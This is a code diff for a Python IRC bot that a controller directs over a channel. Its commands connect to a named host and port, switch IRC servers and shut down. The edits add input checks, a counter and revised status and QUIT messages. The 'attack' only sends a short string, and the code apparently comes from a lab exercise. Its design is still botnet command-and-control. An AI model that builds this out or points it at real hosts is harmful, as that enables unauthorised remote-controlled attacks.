@@ -34,12 +34,19 @@ def cmd_status():
 	
 #attack a specified host 
 def cmd_attack(host, port):
+	global atk_cnt
 	target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	#make connection with target and return status to controller
 	try:
+		if not port.isdigit():
+			print("Error: specified port is not a digit")
+			return_status(nick + " failure")
+			return
+		port = int(port)
 		target.connect((host,port))
-		target.send(bytes(str(atk_cnt) + " " + nick, 'UTF-8'))
+		target.send(bytes(str(atk_cnt) + " " + nick + "\n", 'UTF-8'))
 		return_status(nick + " success")
+		atk_cnt += 1
 	#failed to attack
 	except socket.error:
 		return_status(nick + " failure")
@@ -56,21 +63,22 @@ def cmd_move(host, port_num, chan):
 	#set to new values
 	hostname = hostname
 	port = port_num
-	channel = chan
+	channel = "#" + chan
 	#attempt connection
 	temp_irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	status = connect(temp_irc, host, port)
 	#if connection failed, reset values
 	if status == ERROR_FLAG:
-		print("Error: ould not move to new IRC server")
+		print("Error: Could not move to new IRC server")
+		return_status(nick + " failure")
 		hostname = old_host
 		port = old_port
 		channel = old_channel
 	#else close current irc connection and replace with new one
 	else:
 		#close old IRC connection
-		return_status(nick + " moving")
-		send(irc, "QUIT you killed me/n")
+		return_status(nick + " success")
+		send(irc, "QUIT I will live on.../n")
 		irc.close()
 		irc = temp_irc
 	return
@@ -88,7 +96,7 @@ def cmd_shutdown():
 	active = False
 	#tell controller quitting and disconnect
 	return_status(nick + " shutdown")
-	send(irc, "QUIT/n")
+	send(irc, "QUIT you killed me... /n")
 	return
 
 
@@ -132,7 +140,7 @@ def send(sock, msg):
 	
 #return a status message to the controller
 def return_status(msg):
-	send(irc, "PRIVMSG " + channel + " " + msg + "\n")
+	send(irc, "PRIVMSG " + channel + " :" + msg + "\n")
 	return
 	
 	
